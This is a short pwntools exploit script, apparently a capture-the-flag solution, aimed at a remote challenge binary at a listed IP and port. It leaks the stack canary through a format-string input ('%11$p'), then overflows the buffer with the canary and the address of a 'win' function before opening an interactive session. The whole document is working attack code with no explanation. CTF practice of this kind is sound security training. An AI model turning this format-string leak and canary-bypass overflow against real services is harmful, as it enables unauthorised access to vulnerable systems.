from pwn import *

NC = "nc 34.101.174.85 10002".split()

context.log_level = "warning"

elf = context.binary = ELF("./chall")

r = remote(NC[1],NC[2])

# for i in range(1,20):
#     r.recvuntil(b"<\n")
#     payload = f"%{i}$p".encode()
#     r.sendlineafter(b"> ", payload)
#     print(r.recvline(0), i)

r.sendlineafter(b"> ", b"%11$p")

canary = eval(r.recvline(0))
print(hex(canary))

payload = p64(canary)*7 + p64(elf.sym.win)

r.sendline(payload)

r.interactive()